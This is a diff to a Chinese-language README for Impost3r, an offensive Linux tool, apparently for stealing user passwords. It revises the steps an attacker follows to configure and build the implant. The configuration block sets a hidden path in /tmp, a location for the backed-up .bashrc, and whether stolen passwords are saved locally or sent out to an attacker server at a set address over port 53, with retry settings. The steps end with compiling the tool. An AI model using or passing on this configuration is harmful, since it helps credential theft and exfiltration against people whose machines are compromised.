@@ -45,15 +45,27 @@ fi
 
 - 添加完成后，保存文件并执行```source ~/.bashrc```
 
-- 接着攻击者需要对Impost3r源代码进行修改：
+- 接着攻击者需要对Impost3r源代码main.c进行修改：
 
 ```
-# define MAX_RESEND 30  \\设置当窃取到密码之后，Impost3r向攻击者服务器发送用户密码的最大重试次数
-# define RESEND_INTERVAL 5  \\设置每一次发送密码的间隔
-# define FILENAME "/tmp/.impost3r"  \\设置Impost3r在目标服务器上的位置
+/*
+    Custom setting
+*/
+# define FILENAME "/tmp/.impost3r" \\设置Impost3r在目标服务器上的位置
 # define BACKUP_BASHRC "/tmp/.bashrc" \\设置攻击者备份的源.bashrc在目标服务器上的位置
+# define SAVE_OR_SEND 0 \\设置在窃取成功后是将结果保存在目标机器上或者是发送至攻击者控制的机器(发送=0，保存=1，默认为发送)
+/*
+    Send to server
+*/
+# define MAX_RESEND 30 \\设置当窃取到密码之后，Impost3r向攻击者服务器发送用户密码的最大重试次数
+# define RESEND_INTERVAL 5 \\设置每一次发送密码的间隔
 # define REMOTE_ADDRESS "192.168.0.12" \\设置回送密码的远程地址
 # define REMOTE_PORT 53 \\设置回送密码的远程端口
+
+/*
+    Save to local
+*/
+# define SAVE_LOCATION "/tmp/.cache" \\设置结果文件保存的位置，在SAVE_OR_SEND设置为1的情况下
 ```
 - 修改完成后，保存并在当前目录执行```make```
 
